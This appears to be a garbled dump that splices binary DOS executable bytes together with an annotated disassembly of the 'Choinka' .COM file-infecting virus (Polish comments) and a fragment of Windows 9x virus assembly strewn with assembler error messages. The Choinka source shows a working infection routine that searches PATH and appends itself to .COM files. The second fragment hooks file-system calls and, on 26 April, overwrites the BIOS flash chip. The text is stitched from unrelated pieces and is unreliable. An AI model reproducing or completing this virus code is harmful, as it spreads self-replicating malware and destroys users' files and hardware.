r‚ã|VÉ∆}¨™< u˙^∏ C∫ ÷Õ!âL∏CÉ·˛∫ ÷Õ!∏=∫ ÷Õ!sÈÖ ãÿ∏ WÕ!âLâT¥?π ∫
 ÷Õ!rU= uP∏Bπ  ∫  Õ!rCâ¡- âDÅ¡⁄â˜ÅÔÿâ¥@πYêâÚÅÍ⁄Õ!r=Yêu∏ Bπ  ∫  Õ!r¥@π âÚÉ¬Õ!ãTãLÉ·‡É…∏WÕ!¥>Õ!∏CãL∫ ÷Õ!¥ãé\Õ!¥*Õ!Å˙sÅ˙rÎâÚÅ¬ä ¥	Õ!¥ ÕY3¿3€3“3ˆø W3ˇÄ ÷1u	M  ÎMÈÃp*.COM * ‘ePATH=MKS_DEMO.COM COM                                                ????????COMK 0 FQ	 u	Mœp  MKS_DEMO.COM 

                                      *
                                      *
                                   **∞**
                                 *****∞*****             
                                    **∞**
                                 ****∞****        
                               *******∞*******
                           ***********∞***********                
                                 ****∞****
                              ******∞∞∞******
                            *********∞∞∞*********
                         ************∞∞∞************          
                     ****************∞∞∞****************
                 ********************∞∞∞********************
             ************************∞∞∞************************
                       ±       Merry Christmas       ±
          *            ±              &              ±            *
         *≤*           ±      a  Happy New Year      ±           *≤*
        **≤**          ±  for all my lovely friends  ±          **≤**
      ****≤****        ±            from             ±        ****≤****
    ******≤******      ±      FATHER  CHRISTMAS      ±      ******≤******
                       ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
$		mov	ah, 0~^
#ERROR messages will be removed if you leave these first two lines in     @@@@#
; Wirus Choinka. Otrzymany od Marka Sella 1990-06-10. Podobno juß dosyç
; popularny wûr¢d polskich ußytkownik¢w.
;
; Wirus wzorowany na 648. Od pierwowzoru r¢ßni sië pominiëciem zbëdnych
; instrukcji NOP, zaniechaniem losowej destrukcji zbior¢w oraz wprowadzeniem
; wyûwietlania w okresie od 19 XII do 1 I danego roku rysunku choinki wraz z
; odpowiednimi ßyczeniami (po angielsku).

LF    EQU    0AH
CR    EQU    0DH

S0000	 SEGMENT
    ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000
    ORG    $+0100H

L0100:
    JMP    L71CF			    ;0100 E9 CC 70

;    .
    org    71CFh
;    .

L71CF:
    PUSH    CX		   ;??? 	     ;71CF 51
    MOV    DX,OFFSET L73A9 ;baza zmiennych	  ;71D0 BA A9 73

    ;--- odtworzenie zamazanych bajtow
    CLD 			   ;71D3 FC
    MOV    SI,DX			     ;71D4 8B F2
    ADD    SI,0AH			     ;71D6 83 C6 0A
    MOV    DI,OFFSET L0100		     ;71D9 BF 00 01
    MOV    CX,3 	   ;liczba bajtow    ;71DC B9 03 00
    REPZ    MOVSB	   ;odtworzenie starych    ;71DF F3 A4

    ;--- sprawdzenie wersji DOS
    MOV    SI,DX			     ;71E1 8B F2
    MOV    AH,30H	   ;Get DOS version  ;71E3 B4 30
    INT    21H				     ;71E5 CD 21
    CMP    AL,0 	   ;<2.x ?	     ;71E7 3C 00
    JNZ    L71EE			     ;71E9 75 03
    JMP    L7397	   ;-> tak, odpuszczamy    ;71EB E9 A9 01

    ;--- ustalenie DTA
L71EE:
    PUSH    ES				     ;71EE 06
    MOV    AH,2FH	   ;Get DTA	     ;71EF B4 2F
    INT    21H				     ;71F1 CD 21
    MOV    [SI],BX			     ;71F3 89 1C
    MOV    [SI+2],ES			     ;71F5 8C 44 02
    POP    ES				     ;71F8 07
    MOV    DX,5FH	   ;nowe DTA	     ;71F9 BA 5F 00
    ADD    DX,SI			     ;71FC 03 D6
    MOV    AH,1AH	   ;Set DTA	     ;71FE B4 1A
    INT    21H				     ;7200 CD 21

    ;-- Szukanie sciezki
    PUSH    ES				     ;7202 06
    PUSH    SI				     ;7203 56
    MOV    ES,DS:2CH	   ;Segment Environmentu    ;7204 8E 06 2C 00
    MOV    DI,0 	   ;poczatek stringow	    ;7208 BF 00 00

L720B:
    POP    SI				     ;720B 5E
    PUSH    SI				     ;720C 56
    ADD    SI,1AH	   ;'PATH='          ;720D 83 C6 1A
    LODSB				     ;7210 AC
    MOV    CX,8000h			     ;7211 B9 00 80
    REPNZ    SCASB	   ;szukanie 'P'     ;7214 F2 AE
    MOV    CX,4 	   ;zostaly 4 literki;7216 B9 04 00

L7219:
    LODSB				     ;7219 AC
    SCASB				     ;721A AE
    JNZ    L720B	   ;to nie ta nazwa  ;721B 75 EE
    LOOP    L7219	   ;nastepna literka ;721D E2 FA
    POP    SI		   ; <- znaleziono   ;721F 5E
    POP    ES				     ;7220 07
    MOV    [SI+16H],DI	   ;ptr w Environmencie    ;7221 89 7C 16
    MOV    DI,SI			     ;7224 8B FE
    ADD    DI,1FH	   ;obszar roboczy   ;7226 83 C7 1F
    MOV    BX,SI			     ;7229 8B DE
    ADD    SI,1FH	   ;obszar roboczy   ;722B 83 C6 1F
    MOV    DI,SI			     ;722E 8B FE
    JMP    SHORT    L7268  ;bez katalogu (1 raz)    ;7230 EB 36

    ;--- Nastepny katalog
L7232:
    CMP    WORD PTR [SI+16H],0	  ;czy jest jeszcze ?	 ;7232 83 7C 16 00
    JNZ    L723B	    ;-> tak	     ;7236 75 03
    JMP    L736C	    ;-> nie	     ;7238 E9 31 01

L723B:
    PUSH    DS				     ;723B 1E
    PUSH    SI				     ;723C 56
    MOV    DS,ES:2CH	    ;Segment Environment    ;723D 26 8E 1E 2C 00
    MOV    DI,SI	   ;D0000	     ;7242 8B FE
    MOV    SI,ES:[DI+16H]  ;ptr w environmencie    ;7244 26 8B 75 16
    ADD    DI,1FH	   ;obszar roboczy   ;7248 83 C7 1F
L724B:
    LODSB			     ;724B AC
    CMP    AL,';'          ;delimiter ?      ;724C 3C 3B
    JZ	  L725A 	   ;-> koniec katalogu	  ;724E 74 0A
    CMP    AL,0 	   ;koniec PATH ?    ;7250 3C 00
    JZ	  L7257 	   ;-> tak	     ;7252 74 03
    STOSB		   ;bajt znaku	     ;7254 AA
    JMP    SHORT    L724B		     ;7255 EB F4

L7257:
    MOV    SI,0 			     ;7257 BE 00 00
L725A:
    POP    BX				     ;725A 5B
    POP    DS				     ;725B 1F
    MOV    [BX+16H],SI	   ;ptr w environmencie       ;725C 89 77 16
    CMP    BYTE PTR [DI-1],'\'    ;jest delimiter     ;725F 80 7D FF 5C
    JZ	  L7268 			     ;7263 74 03
    MOV    AL,'\'          ;dopisanie        ;7265 B0 5C
    STOSB				     ;7267 AA

L7268:
    MOV    [BX+18H],DI	   ;adres nazwy programu    ;7268 89 7F 18
    MOV    SI,BX	   ;baza danych      ;726B 8B F3
    ADD    SI,10H	   ;'*.com',0        ;726D 83 C6 10
    MOV    CX,6 	   ;dlugosc nazwy    ;7270 B9 06 00
    REPZ    MOVSB	   ;dopisanie do katalogu    ;7273 F3 A4
    MOV    SI,BX			     ;7275 8B F3
    MOV    AH,4EH	   ;Find First File  ;7277 B4 4E
    MOV    DX,1FH			     ;7279 BA 1F 00
    ADD    DX,SI	   ;offset D001F     ;727C 03 D6
    MOV    CX,3 	   ;attributes RO & Hidd    ;727E B9 03 00
    INT    21H				     ;7281 CD 21
    JMP    SHORT    L7289		     ;7283 EB 04

L7285:
    MOV    AH,4FH	   ;Find Next File   ;7285 B4 4F
    INT    21H				     ;7287 CD 21
L7289:
    JNB    L728D			     ;7289 73 02
    JMP    SHORT    L7232  ;-> Brak zbioru   ;728B EB A5

    ;<-- znaleziono ofiare
L728D:
    MOV    AX,[SI+75H]	   ;Time of last write	  ;728D 8B 44 75
    AND    AL,1EH			     ;7290 24 1E
    CMP    AL,1EH	   ;flaga zarazenia  ;7292 3C 1E
    JZ	  L7285 	   ;-> juz zarazony  ;7294 74 EF
    CMP    WORD PTR [SI+79H],0EA60h;Size low   ;7296 81 7C 79 60 EA
    JA	  L7285 	   ;-> zbyt duzy     ;729B 77 E8
    CMP    WORD PTR [SI+79H],0AH    ;Size low  ;729D 83 7C 79 0A
    JB	  L7285 	   ;-> zbyt maly     ;72A1 72 E2
    MOV    DI,[SI+18H]	   ;adres nazwy pgm  ;72A3 8B 7C 18
    PUSH    SI				     ;72A6 56
    ADD    SI,7DH	   ;Name of file     ;72A7 83 C6 7D
L72AA:
    LODSB				     ;72AA AC
    STOSB		   ;Dopisanie	     ;72AB AA
    CMP    AL,0 			     ;72AC 3C 00
    JNZ    L72AA	   ;-> jeszcze nie koniec    ;72AE 75 FA
    POP    SI				     ;72B0 5E
    MOV    AX,4300h	   ;Get File Attributes    ;72B1 B8 00 43
    MOV    DX,1FH			     ;72B4 BA 1F 00
    ADD    DX,SI	   ;D001F	     ;72B7 03 D6
    INT    21H				     ;72B9 CD 21
    MOV    [SI+8],CX			     ;72BB 89 4C 08
    MOV    AX,4301h	   ;Set File Attributes    ;72BE B8 01 43
    and    cx,0FFFEh			     ;72C1 83 E1 FE
    mov    dx,1Fh			     ;72C4 BA 1F 00
    ADD    dx,si			     ;72C7 03 D6
    INT    21H				     ;72C9 CD 21
    MOV    AX,3D02h	   ;Open Handle R/W  ;72CB B8 02 3D
    MOV    DX,1FH	   ;D001F	     ;72CE BA 1F 00
    ADD    DX,SI			     ;72D1 03 D6
    INT    21H				     ;72D3 CD 21
    JNB    L72DA	   ;-> OK	     ;72D5 73 03
    JMP    L735F	   ;-> Blad	     ;72D7 E9 85 00

L72DA:
    MOV    BX,AX	   ;handle	     ;72DA 8B D8
    MOV    AX,5700h	   ;Get Date/Time of file    ;72DC B8 00 57
    INT    21H				     ;72DF CD 21
    MOV    [SI+4],CX	   ;Time of File     ;72E1 89 4C 04
    MOV    [SI+6],DX	   ;Date of File     ;72E4 89 54 06

; pominiëto fragment specyficzny dla 648, realizujÜcy losowo, co ¢smy raz
; niszczenie infekowanego pliku

    MOV    AH,3FH	   ;Read handle      ;72E7 B4 3F
    MOV    CX,3 	   ;bytes	     ;72E9 B9 03 00
    MOV    DX,0AH			     ;72EC BA 0A 00
    ADD    DX,SI	   ;D000A	     ;72EF 03 D6
    INT    21H				     ;72F1 CD 21
    JB	  L734A 	   ;-> blad	     ;72F3 72 55
    CMP    AX,3 	   ;przeczytano bajtow	  ;72F5 3D 03 00
    JNZ    L734A			     ;72F8 75 50
    MOV    AX,4202h	   ;Move File ptr EOF+0    ;72FA B8 02 42
    MOV    CX,0 			     ;72FD B9 00 00
    MOV    DX,0 			     ;7300 BA 00 00
    INT    21H				     ;7303 CD 21
    JB	  L734A 	   ;-> blad	     ;7305 72 43
    MOV    CX,AX	   ;AX=dlugosc zbioru	;7307 8B C8
    SUB    AX,3 	   ;na dlugosc skoku	;7309 2D 03 00
    MOV    [SI+0EH],AX	   ;D000D+1	     ;730C 89 44 0E
    ADD    CX,02DAh	   ;PSP+dlugosc pgm wirusa    ;730F 81 C1 DA 02
    MOV    DI,SI			     ;7313 8B FE
    SUB    DI,01D8h			     ;7315 81 EF D8 01
    MOV    [DI],CX	   ;L71D0+1	     ;7319 89 0D
    MOV    AH,40H	   ;Write Handle     ;731B B4 40
    MOV    CX,0759h	   ;Dlugosc wirusa   ;731D B9 59 07
    NOP 				     ;7320 90
    MOV    DX,SI			     ;7321 8B D6
    SUB    DX,01DAh	   ;poczatek wirusa  ;7323 81 EA DA 01
    INT    21H				     ;7327 CD 21
    JB	  L734A 	   ;-> blad	     ;7329 72 1F
    CMP    AX,0759h	   ;czy calosc zapisano ?    ;732B 3D 59 07
    NOP 				     ;732E 90
    JNZ    L734A	   ;-> nie, blad     ;732F 75 19
    MOV    AX,4200h	   ;Move file ptr BOF +    ;7331 B8 00 42
    MOV    CX,0 			     ;7334 B9 00 00
    MOV    DX,0 			     ;7337 BA 00 00
    INT    21H				     ;733A CD 21
    JB	  L734A 	   ;-> blad	     ;733C 72 0C
    MOV    AH,40H	   ;Write Handle     ;733E B4 40
    MOV    CX,3 	   ;bytes	     ;7340 B9 03 00
    MOV    DX,SI			     ;7343 8B D6
    ADD    DX,0DH	   ;D000D	     ;7345 83 C2 0D
    INT    21H				     ;7348 CD 21
	    ;<- blad czytania zbioru
L734A:
    MOV    DX,[SI+6]	   ;Date of File     ;734A 8B 54 06
    MOV    CX,[SI+4]	   ;Time of File     ;734D 8B 4C 04
    and    cx,0FFE0h			     ;7350 83 E1 E0
    or	   cx,1Eh			     ;7353 83 C9 1E
    MOV    AX,5701h	   ;Set Date/Time of File    ;7356 B8 01 57
    INT    21H				     ;7359 CD 21
    MOV    AH,3EH	   ;Close Handle     ;735B B4 3E
    INT    21H				     ;735D CD 21

	    ;<- po bledzie otwarcia
L735F:
    MOV    AX,4301h    ;Set File Attributes  ;735F B8 01 43
    MOV    CX,[SI+8]	;atrybuty znalezione ;7362 8B 4C 08
    MOV    DX,1FH			     ;7365 BA 1F 00
    ADD    DX,SI	;D001F		     ;7368 03 D6
    INT    21H				     ;736A CD 21

	    ;<- nie znaleziono ofiary
L736C:
    PUSH    DS				     ;736C 1E
    MOV    AH,1AH	 ;Set DTA	     ;736D B4 1A
    MOV    DX,[SI]	  ;zastana wartosc DTA	      ;736F 8B 14
    MOV    DS,[SI+2]			     ;7371 8E 5C 02
    INT    21H				     ;7374 CD 21
    POP    DS				     ;7376 1F

; istotna r¢ßnica miëdzy choinkÜ i 648. 648 oddaje tu sterowanie do
; programu nosiciela

    MOV    AH,2AH	 ;Get Date	     ;7377 B4 2A
    INT    21H			      ;7379 CD 21
    CMP    DX,0C13h    ;month=12, day=19     ;737B 81 FA 13 0C
    JNB    L7389	;-> po 18 grudnia    ;737F 73 08
    CMP    DX,0101h    ;month=1, day=1	     ;7381 81 FA 01 01
    JB	  L7389        ;wczesniejszy dzien !!!???    ;7385 72 02
    JMP    SHORT    L7397    ;-> data nie swiateczna  ;7387 EB 0E

L7389:
    MOV    DX,SI			     ;7389 8B D6
    ADD    DX,8AH	 ;adres choinki      ;738B 81 C2 8A 00
    MOV    AH,9        ;display string	     ;738F B4 09
    INT    21H				     ;7391 CD 21
    MOV    AH,0        ;czekaj na klawisz    ;7393 B4 00
    INT    16H				     ;7395 CD 16

L7397:
    POP    CX		 ;odtworzenie rejestrow    ;7397 59
    XOR    AX,AX			     ;7398 33 C0
    XOR    BX,BX			     ;739A 33 DB
    XOR    DX,DX			     ;739C 33 D2
    XOR    SI,SI			     ;739E 33 F6
    MOV    DI,OFFSET L0100	  ;adres startowy	 ;73A0 BF 00 01
    PUSH    DI				     ;73A3 57
    XOR    DI,DI			     ;73A4 33 FF
    RETN    0FFFFH	      ;uruchomienie programu	;73A6 C2 FF FF
~   ^
#ERROR 01: Unknown Mnemonic                                               @@@@#

;------------------------------------------------
;    Dane
;------------------------------------------------
L73A9	 label	  byte
D0000	 dw    0080h	    ;old DTA offset	   ;73A9 80 00
D0002	 dw    31D6h	    ;	  segment	   ;73AB D6 31
D0004	 dw    0975h	    ;Time of File	   ;73AD 75 09
D0006	 dw    144Dh	    ;Date of File	   ;73AF 4D 14
D0008	 dw    0020h	    ;atrybuty zbioru	   ;73B1 20 00
D000A	 db    0EBh,16h,4Dh ;schowane bajty	   ;73B3 EB 16 4D
D000D	 db    0E9h	    ;=JMP    (zastepstwo)  ;73B6 E9
D000E	 dw    70CCh	    ;przesuniecie	   ;73B7 cc 70
D0010	 DB    '*.COM',0    ;wzorzec szukania      ;73B9 2A 2E 43 4F 4D 00
D0016	 dw    002Ah	    ;ptr w PATH 	   ;73BF 2A 00
D0018	 dw    65D4h	    ;adres nazwy zb. w D001F ;73C1 D4 65
D001A	 DB    'PATH='                             ;73C3 50 41 54 48 3D

    ;--- obszar roboczy
D001F	 db    'MKS_DEMO.COM',0    ;73C8 4D 4B 53 5F 44 45 4D 4F 2E 43 4F 4D 00
    db	  'COM',0                  ;73D5 43 4F 4D 00
    db	  '                        ';73D9 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
    DB	  '                       ' ;73F1 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20

    ;--- nowe DTA
D005F	 db    3,'????????COM'  ;Reserved              ;7408 03 .. .. .. .. ...
	 db    3,'K',0,'0',0,'F',51h,0Fh,09h           ;7418 .. .. 51 0F 09
D0074	 db    20h		;Attribute found       ;741D 20
D0075	 dw    0975h		;Time of last write    ;741E 75 09
D0077	 dw    144Dh		;Date of last write    ;7420 4D 14
D0079	 dw    70CFH		;Size low	       ;7422 CF 70
D007B	 dw    0		;Size High	       ;7424 00 00
D007D	 db    'MKS_DEMO.COM',0    ;Name of file        ;7426 4D 4B 53 5F 44 45 4D 4F 2E 43 4F 4D 00

    ;--- Choinka
D008A	 label	  byte			      ;7433
 DB lf,cr
 db lf,cr,'                                      *'
 db lf,cr,'                                      *'
 db lf,cr,'                                   **∞**'
 db lf,cr,'                                 *****∞*****             '
 db lf,cr,'                                    **∞**'
 db lf,cr,'                                 ****∞****        '
 db lf,cr,'                               *******∞*******'
 db lf,cr,'                           ***********∞***********                '
 db lf,cr,'                                 ****∞****'
 db lf,cr,'                              ******∞∞∞******'
 db lf,cr,'                            *********∞∞∞*********'
 db lf,cr,'                         ************∞∞∞************          '
 db lf,cr,'                     ****************∞∞∞****************'
 db lf,cr,'                 ********************∞∞∞********************'
 db lf,cr,'             ************************∞∞∞************************'
 db lf,cr,'                       ±       Merry Christmas       ±'
 db lf,cr,'          *            ±              &              ±            *'
 DB lf,cr,'         *≤*           ±      a  Happy New Year      ±           *≤*'
 DB lf,cr,'        **≤**          ±  for all my lovely friends  ±          **≤**'
 DB lf,cr,'      ****≤****        ±            from             ±        ****≤****'
 DB lf,cr,'    ******≤******      ±      FATHER  CHRISTMAS      ±      ******≤******'
 DB lf,cr,'                       ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±'
 DB lf,cr,'$'

S0000	 ENDS

    END    L0100

    @@@@#
			add	[esp+08h], ebp

			; Set End Mark
			xor	ebx, ebx
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#
			mov	[eax-04h], ebx
~			   	              ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

; ***************************
; * When VirusGame Calls    *
; * VxDCall, VMM Modifies   *
; * the 'int 20h' and the   *
; * 'Service Identifier'    *
; * to 'Call [XXXXXXXX]'.   *
; ***************************
; * Before Writing My Virus *
; * to File, I Must Restore *
; * them First.     ^__^    *
; ***************************

			lea	eax, (LastVxDCallAddress-2-@9)[esi]
~			   	                                   ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

			mov	cl, VxDCallTableSize

LoopOfRestoreVxDCallID:
			mov	word ptr [eax], 20cdh

			mov	edx, (VxDCallIDTable+(ecx-1)*04h-@9)[esi]
~			   	                                         ^
#ERROR 21: Bad Single Operand                                             @@@@#
			mov	[eax+2], edx
~			   	            ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

			movzx	edx, byte ptr (VxDCallAddressTable+ecx-1-@9)[esi]
~			^
#ERROR 01: Unknown Mnemonic                                               @@@@#
			sub	eax, edx
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

			loop	LoopOfRestoreVxDCallID

; ***************************
; * Let's Write             *
; * Virus Code to the File  *
; ***************************

WriteVirusCodeToFile:
			mov	eax, dr1
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#
			mov	ebx, [eax+10h]
~			   	              ^
#ERROR 21: Bad Single Operand                                             @@@@#
			mov	edi, [eax]
~			   	          ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

LoopOfWriteVirusCodeToFile:

			pop	ecx
~			   	   ^
#ERROR 21: Bad Single Operand                                             @@@@#
			jecxz	SetFileModificationMark
~			^
#ERROR 01: Unknown Mnemonic                                               @@@@#

			mov	esi, ecx
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#
			mov	eax, 0d601h
~			   	           ^
#ERROR 40: Conflicting Multiple Definition Not Allowed                    @@@@#
			pop	edx
~			   	   ^
#ERROR 21: Bad Single Operand                                             @@@@#
			pop	ecx
~			   	   ^
#ERROR 21: Bad Single Operand                                             @@@@#

			call	edi	; VXDCall IFSMgr_Ring0_FileIO

			jmp	LoopOfWriteVirusCodeToFile

; ***************************
; * Let's Set CF = 1 ==>    *
; * Need to Restore File    *
; * Modification Time       *
; ***************************

SetFileModificationMark:
			pop	ebx
~			   	   ^
#ERROR 21: Bad Single Operand                                             @@@@#
			pop	eax
~			   	   ^
#ERROR 21: Bad Single Operand                                             @@@@#

			stc		; Enable CF(Carry Flag)
			pushf

; *************************************
; * Close File                        *
; *************************************

CloseFile:
~         ^
#ERROR 02: Jump > 128                                                     @@@@#
			xor	eax, eax
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#
			mov	ah, 0d7h
			call	edi	; VXDCall IFSMgr_Ring0_FileIO

; *************************************
; * Need to Restore File Modification *
; * Time !?                           *
; *************************************

			popf
			pop	esi
~			   	   ^
#ERROR 21: Bad Single Operand                                             @@@@#
			jnc	IsKillComputer

; *************************************
; * Restore File Modification Time    *
; *************************************

			mov	ebx, edi
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

			mov	ax, 4303h
			mov	ecx, (FileModificationTime-@7)[esi]
~			   	                                   ^
#ERROR 21: Bad Single Operand                                             @@@@#
			mov	edi, (FileModificationTime+2-@7)[esi]
~			   	                                     ^
#ERROR 21: Bad Single Operand                                             @@@@#
			call	ebx	; VXDCall IFSMgr_Ring0_FileIO

; *************************************
; * Disable OnBusy                    *
; *************************************

DisableOnBusy:
~             ^
#ERROR 02: Jump > 128                                                     @@@@#
			dec	byte ptr (OnBusy-@7)[esi]	; Disable OnBusy

; *************************************
; * Call Previous FileSystemApiHook   *
; *************************************

prevhook:
~        ^
#ERROR 02: Jump > 128                                                     @@@@#
			popad
~			^
#ERROR 01: Unknown Mnemonic                                               @@@@#

			mov	eax, dr0	;
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#
			jmp	[eax]		; Jump to prevhook

; *************************************
; * Call the Function that the IFS    *
; * Manager Would Normally Call to    *
; * Implement this Particular I/O     *
; * Request.                          *
; *************************************

pIFSFunc:
~        ^
#ERROR 02: Jump > 128                                                     @@@@#
			mov	ebx, esp
~			   	        ^
#ERROR 09: Constant Required                                              @@@@#
			push	dword ptr [ebx+20h+04h+14h]	; Push pioreq
			call	[ebx+20h+04h]			; Call pIFSFunc
			pop	ecx				;
~			   	   ^
#ERROR 21: Bad Single Operand                                             @@@@#

			mov	[ebx+1ch], eax	; Modify EAX Value in Stack
~			   	              ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

; ***************************
; * After Calling pIFSFunc, *
; * Get Some Data from the  *
; * Returned pioreq.        *
; ***************************

			cmp	dword ptr [ebx+20h+04h+04h], 00000024h
			jne	QuitMyVirusFileSystemHook

; *****************
; * Get the File  *
; * Modification  *
; * Date and Time *
; * in DOS Format.*
; *****************

			mov	eax, [ecx+28h]
~			   	              ^
#ERROR 21: Bad Single Operand                                             @@@@#
			mov	(FileModificationTime-@6)[esi], eax
~			   	                                   ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

; ***************************
; * Quit My Virus'          *
; * IFSMgr_FileSystemHook   *
; ***************************

QuitMyVirusFileSystemHook:

			popad
~			^
#ERROR 01: Unknown Mnemonic                                               @@@@#

			ret

; *************************************
; * Kill Computer !? ...   *^_^*      *
; *************************************

IsKillComputer:
			; Get Now Month from BIOS CMOS
			mov	ax, 0708h
			out	70h, al
			in	al, 71h

			xchg	ah, al

			; Get Now Day from BIOS CMOS
			out	70h, al
			in	al, 71h

			xor	ax, 0426h	; 04/26/????
			jne	DisableOnBusy

; **************************************
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; **************************************

; ***************************
; * Kill BIOS EEPROM        *
; ***************************

			mov	bp, 0cf8h
			lea	esi, IOForEEPROM-@7[esi]
~			   	                        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

; ***********************
; * Show BIOS Page in   *
; * 000E0000 - 000EFFFF *
; *    (   64 KB   )    *
; ***********************

			mov	edi, 8000384ch
~			   	              ^
#ERROR 40: Conflicting Multiple Definition Not Allowed                    @@@@#
			mov	dx, 0cfeh
			cli
			call	esi

; ***********************
; * Show BIOS Page in   *
; * 000F0000 - 000FFFFF *
; *    (   64 KB   )    *
; ***********************

			mov	di, 0058h
			dec	edx					; and al,0fh
~			   	   ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#
			mov	word ptr (BooleanCalculateCode-@10)[esi], 0f24h
			call	esi

; ***********************
; * Show the BIOS Extra *
; * ROM Data in Memory  *
; * 000E0000 - 000E01FF *
; *   (   512 Bytes   ) *
; * , and the Section   *
; * of Extra BIOS can   *
; * be Writted...       *
; ***********************

			lea	ebx, EnableEEPROMToWrite-@10[esi]
~			   	                                 ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

			mov	eax, 0e5555h
~			   	            ^
#ERROR 40: Conflicting Multiple Definition Not Allowed                    @@@@#
			mov	ecx, 0e2aaah
~			   	            ^
#ERROR 40: Conflicting Multiple Definition Not Allowed                    @@@@#
			call	ebx
			mov	byte ptr [eax], 60h

			push	ecx
			loop	$

; ***********************
; * Kill the BIOS Extra *
; * ROM Data in Memory  *
; * 000E0000 - 000E007F *
; *   (   80h Bytes   ) *
; ***********************

			xor	ah, ah
			mov	[eax], al
~			   	         ^
#ERROR 40: Conflicting Multiple Definition Not Allowed                    @@@@#

			xchg	ecx, eax
~			    	        ^
#ERROR 11: Constant/Label Not Allowed                                     @@@@#
			loop	$

; ***********************
; * Show and Enable the *
; * BIOS Main ROM Data  *
; * 000E0000 - 000FFFFF *
; *   (   128 KB   )    *
; * can be Writted...   *
; ***********************

			mov	eax, 0f5555h
~			   	            ^
#ERROR 40: Conflicting Multiple Definition Not Allowed                    @@@@#
			pop	ecx
~			   	   ^
#ERROR 21: Bad Single Operand                                             @@@@#
			mov	ch, 0aah
			call	ebx
			mov	byte ptr [eax], 20h

			loop	$

; ***********************
; * Kill the BIOS Main  *
; * ROM Data in Memory  *
; * 000FE000 - 000FE07F *
; *   (   80h Bytes   ) *
; ***********************

			mov	ah, 0e0h
			mov	[eax], al
~			   	         ^
#ERROR 40: Conflicting Multiple Definition Not Allowed                    @@@@#

; ***********************
; * Hide BIOS Page in   *
; * 000F0000 - 000FFFFF *
; *    (   64 KB   )    *
; ***********************
									; or al,10h
			mov	word ptr (BooleanCalculateCode-@10)[esi], 100ch
			call	esi

; ******************PË  X- QRãì ãÿå»éÿø ãG¸âäG˛àE3¿éÿªã=vtQ∏vâ∏  é¿å»éÿ¸ø  ª}¨™Ku˚∏  éÿ°Ñ â¡∏í ªÑ â°Ü ã–å¿âGéÿâ»ªQâG˝ã¬âGˇª, .ãª⁄ âG˝ª ZYX˚ˇ„ÎMPÄ¸Ku%WVSQR∏=Õ!r#Pãÿπˇˇ∫  ∏ êéÿ¥?Õ!ãÿÎêÈå ∏ êéÿXÎêÎzêã  Å˘MZu
∏  éÿ∫ ÎøãW˝Å˙SLt\PS3€ãøì .âE¸äG.àE˛[3ˇã√- âE∞Èàæ  åÿé¿å»éÿâﬂª}¸¨™Ku˚XãÿSãœQ3…3“∏ BÕ!Y[S∏ êéÿ3“¥@Õ![¥>Õ!ZY[^_XÍ¡26.07.91.Pre-released Microelephant by CSL 